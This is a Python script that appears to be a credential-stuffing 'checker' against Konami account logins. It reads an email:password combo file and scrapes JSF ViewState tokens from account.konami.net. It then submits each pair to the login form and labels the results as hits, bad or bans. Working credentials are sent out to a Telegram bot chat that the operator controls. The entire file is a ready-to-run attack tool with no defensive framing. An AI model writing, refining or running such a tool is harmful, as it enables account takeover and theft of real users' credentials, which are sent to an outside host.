import requests
import urllib.parse
from cfonts import render
import os

# Telegram token ve chat_id girişleri
bot_token = input("Enter your Telegram Bot Token: ").strip()
chat_id = input("Enter your Telegram Chat ID: ").strip()

# Başlık
THOMAS = render('{ Pes }', colors=['white', 'blue'], align='center')
print(THOMAS)

class ThomasKonamiLogin:
    def __init__(self, combo_file):
        self.combo_file = combo_file
        self.base_url = "https://account.konami.net/connect/"
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }

    def thomas_sifre(self, password):
        return len(password) >= 8

    def thomas_can(self, method, url, **kwargs):
        response = requests.request(method, url, **kwargs)
        return response

    def parse_source(self, source, start, end):
        start_idx = source.find(start) + len(start)
        end_idx = source.find(end, start_idx)
        return source[start_idx:end_idx]

    def load_thomas_combo(self):
        with open(self.combo_file, "r") as file:
            thomas_combo = [line.strip().split(":") for line in file.readlines()]
        return thomas_combo

    def send_telegram(self, message):
        try:
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            payload = {
                "chat_id": chat_id,
                "text": message
            }
            requests.post(url, data=payload)
        except Exception as e:
            print(f"[!] Telegram error: {e}")

    def login(self, user, password):
        if not self.thomas_sifre(password):
            print(f"BAD ❌ {user} : {password}")
            return

        response = self.thomas_can("GET", self.base_url, headers=self.headers)
        if "Bad Request" in response.text:
            print("ERROR ❌.")
            return

        aa = self.parse_source(response.text, '<input type="hidden" name="footer-form" value="footer-form" />', 'autocomplete="off" />')
        t = self.parse_source(aa, 'value="', '"')

        data = {
            "topForm": "topForm",
            "javax.faces.ViewState": t,
            "topForm:j_idt52": "topForm:j_idt52"
        }
        post_url = f"{self.base_url}index.html"
        response = self.thomas_can("POST", post_url, data=data, headers=self.headers)
        t2 = self.parse_source(response.text, 'id="j_id1:javax.faces.ViewState:0" value="', '"')

        user_encoded = urllib.parse.quote(user)
        password_encoded = urllib.parse.quote(password)

        data = {
            "loginForm": "loginForm",
            "loginForm:userId": user_encoded,
            "loginForm:password": password_encoded,
            "loginForm:otp": "",
            "loginForm:j_idt51": "",
            "javax.faces.ViewState": t2
        }
        login_url = f"{self.base_url}login.html"
        response = self.thomas_can("POST", login_url, data=data, headers=self.headers)

        if "iid?code=" in response.headers:
            print(f"TRUE ✅ {user} : {password}")
            self.send_telegram(f"✅ Konami Hit:\nEmail: {user}\nPassword: {password}")
        elif response.status_code == 200:
            print(f"BAD ❌ {user} : {password}")
        elif "Bad Request" in response.text:
            print(f"BAN 🔐 {user} : {password}")

    def thomas(self):
        thomas_combo = self.load_thomas_combo()
        for user, password in thomas_combo:
            self.login(user, password)


if __name__ == "__main__":
    combo_file = input(" ~ ENTER COMBO FILE: ")
    konami_login = ThomasKonamiLogin(combo_file)
    konami_login.thomas()
